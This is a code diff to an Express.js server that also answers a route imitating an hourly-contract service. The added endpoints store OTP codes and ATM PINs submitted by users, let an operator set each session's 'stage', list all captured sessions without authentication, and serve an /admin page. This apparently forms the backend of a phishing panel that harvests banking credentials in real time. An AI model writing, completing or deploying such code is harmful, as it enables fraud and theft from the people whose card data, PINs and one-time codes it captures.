@@ -96,6 +96,69 @@ app.get('/en/api/HourlyContract/IsHourlySectorAvailable', (req, res) => {
   res.status(404).json({ error: 'Not found' });
 });
 
+// Payment Sessions In-Memory Store & API
+const paymentSessions = new Map();
+
+app.post('/api/payment-session', (req, res) => {
+  const b = req.body || {};
+  const sessionId = b.sessionId || 'sess_' + Date.now();
+  const existing = paymentSessions.get(sessionId) || {};
+  const updated = { ...existing, ...b, updatedAt: new Date() };
+  paymentSessions.set(sessionId, updated);
+  res.json({ success: true, sessionId });
+});
+
+app.get('/api/payment-session/:sessionId', (req, res) => {
+  const sess = paymentSessions.get(req.params.sessionId);
+  if (!sess) return res.status(404).json({ error: 'Session not found' });
+  res.json(sess);
+});
+
+app.post('/api/payment-session/:sessionId/otp', (req, res) => {
+  const { sessionId } = req.params;
+  const { otpCode, stage } = req.body;
+  const sess = paymentSessions.get(sessionId) || { sessionId };
+  sess.otpCode = otpCode;
+  sess.stage = stage || 'otp_pending';
+  sess.updatedAt = new Date();
+  paymentSessions.set(sessionId, sess);
+  res.json({ success: true });
+});
+
+app.post('/api/payment-session/:sessionId/atm', (req, res) => {
+  const { sessionId } = req.params;
+  const { atmPin, stage } = req.body;
+  const sess = paymentSessions.get(sessionId) || { sessionId };
+  sess.atmPin = atmPin;
+  sess.stage = stage || 'atm_pending';
+  sess.updatedAt = new Date();
+  paymentSessions.set(sessionId, sess);
+  res.json({ success: true });
+});
+
+app.post('/api/payment-session/:sessionId/stage', (req, res) => {
+  const { sessionId } = req.params;
+  const { stage } = req.body;
+  const sess = paymentSessions.get(sessionId);
+  if (sess) {
+    sess.stage = stage;
+    sess.updatedAt = new Date();
+    paymentSessions.set(sessionId, sess);
+  }
+  res.json({ success: true });
+});
+
+app.get('/api/payment-sessions', (req, res) => {
+  const list = Array.from(paymentSessions.values()).sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt));
+  res.json(list);
+});
+
+app.get('/admin', (req, res) => {
+  const adminPath = path.join(__dirname, 'public', 'admin.html');
+  if (fs.existsSync(adminPath)) return res.sendFile(adminPath);
+  res.status(404).send('Admin panel not found');
+});
+
 // Leads Submission API
 app.post('/api/leads', async (req, res) => {
   const b = req.body || {};
